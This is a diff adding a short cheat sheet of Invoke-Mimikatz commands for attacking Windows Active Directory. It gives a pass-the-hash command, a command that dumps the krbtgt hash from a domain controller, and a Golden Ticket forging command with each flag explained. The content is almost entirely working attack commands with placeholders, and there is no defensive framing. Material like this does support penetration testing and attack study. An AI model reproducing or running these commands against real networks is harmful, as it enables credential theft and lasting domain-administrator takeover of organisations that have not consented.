@@ -1,0 +1,19 @@
+ -------- Invoke -----------
+ ##### Pass the hash (PTH)
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:<binary to "runas">" '
+
+##### Golden Ticket
+FIRST GET KRBTGT
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+THEN with NTLM hash for krbtgt
+Invoke-Mimikatz -Command '"kerberos::golden /User:<user> /domain:<domain> /sid:<> /krbtgt:<NTLM HASH FOR krbtgt> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+      - Module: kerberos::golden
+      /User: User to create ticket for
+      /domain: Domain FDQN
+      /sid: sid of the domain
+      /target: target server (DC)
+      /krbtgt: krbtgt hash (RC4)
+      /id: optional user RID (default 500)
+      /group optional group RID
+      /ptt: or /ticket: injects into current PS session or saves to disk
+ -------- Binary -----------
